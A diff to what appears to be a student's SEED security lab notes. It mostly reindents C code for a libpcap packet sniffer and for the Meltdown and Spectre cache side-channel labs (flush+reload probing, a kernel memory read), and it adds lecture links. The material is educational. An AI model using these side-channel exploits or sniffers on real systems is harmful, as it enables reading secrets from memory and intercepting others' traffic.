@@ -116,6 +116,7 @@ adb install RepackagingLab.apk
 ## Lab5 TicTacToe Malware
 
 ## Lab6 Packet Sniffing and Spoofing
+講義: http://www.cis.syr.edu/~wedu/seed/Labs_16.04/Networking/Sniffing_Spoofing/
 ### task1 Using Tools to Sniff and Spoof Packets
 #### 1-1 Sniffing Packets
 ```python=
@@ -228,31 +229,31 @@ We can process each packet inside the function.
 */
 void got_packet(u_char *args,const struct pcap_pkthdr *header,const u_char *packet)
 {
-	printf("Got a packet\n");
-	printf("%s\n",packet);
+  printf("Got a packet\n");
+  printf("%s\n",packet);
 }
 int main()
 {
-	pcap_t *handle;
-	char errbuf[PCAP_ERRBUF_SIZE];
-	struct bpf_program fp;
-	char filter_exp[] = "tcp dst port 10-100";
-	bpf_u_int32 net;
-	
-	// Step 1: Open live pcap session on NIC with name eth3
-	//         Students needs to change "eth3" to the name
-	//         found on their own machines (using ifconfig).
-	handle = pcap_open_live("enp0s3", BUFSIZ, 0, 1000, errbuf);
+  pcap_t *handle;
+  char errbuf[PCAP_ERRBUF_SIZE];
+  struct bpf_program fp;
+  char filter_exp[] = "tcp dst port 10-100";
+  bpf_u_int32 net;
+  
+  // Step 1: Open live pcap session on NIC with name eth3
+  //         Students needs to change "eth3" to the name
+  //         found on their own machines (using ifconfig).
+  handle = pcap_open_live("enp0s3", BUFSIZ, 0, 1000, errbuf);
 
-	// Step 2: Compile filter_exp into BPF psuedo-code
-	pcap_compile(handle, &fp, filter_exp, 0, net);
-	pcap_setfilter(handle, &fp);
+  // Step 2: Compile filter_exp into BPF psuedo-code
+  pcap_compile(handle, &fp, filter_exp, 0, net);
+  pcap_setfilter(handle, &fp);
 
-	// Step 3: Capture packets
-	pcap_loop(handle, -1, got_packet, NULL);
+  // Step 3: Capture packets
+  pcap_loop(handle, -1, got_packet, NULL);
 
-	pcap_close(handle);   //Close the handle
-	return 0;
+  pcap_close(handle);   //Close the handle
+  return 0;
 }
 // Note: don’t forget to add "-lpcap" to the compilation command.
 // For example: gcc -o sniff sniff.c -lpcap
@@ -285,6 +286,7 @@ Netmask: 全域。
 (Capture the TCP packets with a destination port number in the range from 10 to 100)
 
 ## Lab7 Meltdown Attack
+講義: http://www.cis.syr.edu/~wedu/seed/Labs_16.04/System/Meltdown_Attack/
 #### task1 Reading from Cache versus from Memory
 ```c=
 // CacheTime.cpp
@@ -297,31 +299,31 @@ uint8_t array[10*4096];
 
 int main(int argc, const char **argv)
 {
-	uint32_t junk=0;
-	uint64_t time1,time2;
-	uint32_t *addr;
-	int i;
+  uint32_t junk=0;
+  uint64_t time1,time2;
+  uint32_t *addr;
+  int i;
 
-	// Initialize the array
-	for(i=0; i<10; i++) array[i*4096]=1;
+  // Initialize the array
+  for(i=0; i<10; i++) array[i*4096]=1;
 
-	// Flush the array from the CPU cache
-	for(i=0; i<10; i++) _mm_clflush(&array[i*4096]);
+  // Flush the array from the CPU cache
+  for(i=0; i<10; i++) _mm_clflush(&array[i*4096]);
 
-	// Access some of the array items 
-	array[3*4096] = 100;
-	array[7*4096] = 200;
+  // Access some of the array items 
+  array[3*4096] = 100;
+  array[7*4096] = 200;
 
-	for(i=0; i<10; i++){
-		addr = (uint32_t*)&array[i*4096];
-		time1 = __rdtscp(&junk);
-		junk = *addr;
-		time2 = __rdtscp(&junk)-time1;
-		printf("Access time for array[%d*4096]: %d CPU cycles\n"
-			,i,(int)time2);
+  for(i=0; i<10; i++){
+    addr = (uint32_t*)&array[i*4096];
+    time1 = __rdtscp(&junk);
+    junk = *addr;
+    time2 = __rdtscp(&junk)-time1;
+    printf("Access time for array[%d*4096]: %d CPU cycles\n"
+      ,i,(int)time2);
 
-	}
-	return 0;
+  }
+  return 0;
 }
 ```
 ![](https://i.imgur.com/Kq6567R.png)
@@ -347,45 +349,45 @@ char secret = 94;
 
 void flushSideChannel()
 {
-	int i;
-	// Write to array to bring it to RAM to prevent Copy-on-write
-	for (i = 0; i < 256; i++) 
-		array[i*4096 + DELTA] = 1;
-	// Flush the values of the array from cache
-	for (i = 0; i < 256; i++) 
-		_mm_clflush(&array[i*4096 +DELTA]);
+  int i;
+  // Write to array to bring it to RAM to prevent Copy-on-write
+  for (i = 0; i < 256; i++) 
+    array[i*4096 + DELTA] = 1;
+  // Flush the values of the array from cache
+  for (i = 0; i < 256; i++) 
+    _mm_clflush(&array[i*4096 +DELTA]);
 }
 
 void victim()
 {
-	temp = array[secret*4096 + DELTA];
+  temp = array[secret*4096 + DELTA];
 }
 
 void reloadSideChannel()
 {
-	uint32_t junk=0;
-	uint32_t *addr;
-	uint64_t time1, time2;
+  uint32_t junk=0;
+  uint32_t *addr;
+  uint64_t time1, time2;
 
-	int i;
-	for(i = 0; i < 256; i++){
-		addr = (uint32_t*)&array[i*4096 + DELTA];
-		time1 = __rdtscp(&junk);
-		junk = *addr;
-		time2 = __rdtscp(&junk) - time1;
-		if (time2 <= CACHE_HIT_THRESHOLD){
-			printf("array[%d*4096 + %d] is in cache.\n", i, DELTA);
-			printf("The Secret = %d.\n",i);
-		}
-	}
+  int i;
+  for(i = 0; i < 256; i++){
+    addr = (uint32_t*)&array[i*4096 + DELTA];
+    time1 = __rdtscp(&junk);
+    junk = *addr;
+    time2 = __rdtscp(&junk) - time1;
+    if (time2 <= CACHE_HIT_THRESHOLD){
+      printf("array[%d*4096 + %d] is in cache.\n", i, DELTA);
+      printf("The Secret = %d.\n",i);
+    }
+  }
 }
 
 int main(int argc, const char **argv)
 {
-	flushSideChannel();
-	victim();
-	reloadSideChannel();
-	return (0);
+  flushSideChannel();
+  victim();
+  reloadSideChannel();
+  return (0);
 }
 ```
 ![](https://i.imgur.com/OIVUF1W.png)
@@ -404,10 +406,10 @@ dmesg | grep `secret data address`
 
 int main()
 {
-	char *kernel_data_addr = (char*)0xf9ce3000;
-	char kernel_data = *kernel_data_addr;
-	printf("I have reached here.\n");
-	return 0;
+  char *kernel_data_addr = (char*)0xf9ce3000;
+  char kernel_data = *kernel_data_addr;
+  printf("I have reached here.\n");
+  return 0;
 }
 ```
 ![](https://i.imgur.com/lCP226V.png)
@@ -498,7 +500,7 @@ void reloadSideChannel()
          printf("array[%d*4096 + %d] is in cache.\n",i,DELTA);
          printf("The Secret = %d.\n",i);
      }
-  }	
+  } 
 }
 /*********************** Flush + Reload ************************/
 
@@ -664,7 +666,7 @@ int main()
             perror("pread");
             break;
          }
-	
+  
          // Flush the probing array
          for (j = 0; j < 256; j++) 
             _mm_clflush(&array[j * 4096 + DELTA]);
@@ -691,6 +693,7 @@ int main()
 ![](https://i.imgur.com/h91xpsx.png)
 
 ## Lab8 Specture Attack
+講義: https://seedsecuritylabs.org/Labs_16.04/System/Spectre_Attack/
 ### task1 Read from Cache versus from Memeory (same as Lab7 task1)
 ### task2 Using Cache as a Side Channel (same as Lab7 task2)
 ### task3 Out-of-Order Execution and Branch Prediction 
@@ -728,7 +731,7 @@ void reloadSideChannel()
     junk = *addr;
     time2 = __rdtscp(&junk) - time1;
     if (time2 <= CACHE_HIT_THRESHOLD){
-	printf("array[%d*4096 + %d] is in cache.\n", i, DELTA);
+  printf("array[%d*4096 + %d] is in cache.\n", i, DELTA);
         printf("The Secret = %d.\n",i);
     }
   } 
@@ -809,7 +812,7 @@ void reloadSideChannel()
     junk = *addr;
     time2 = __rdtscp(&junk) - time1;
     if (time2 <= CACHE_HIT_THRESHOLD){
-	printf("array[%d*4096 + %d] is in cache.\n", i, DELTA);
+  printf("array[%d*4096 + %d] is in cache.\n", i, DELTA);
         printf("The Secret = %c.\n",i);
     }
   } 
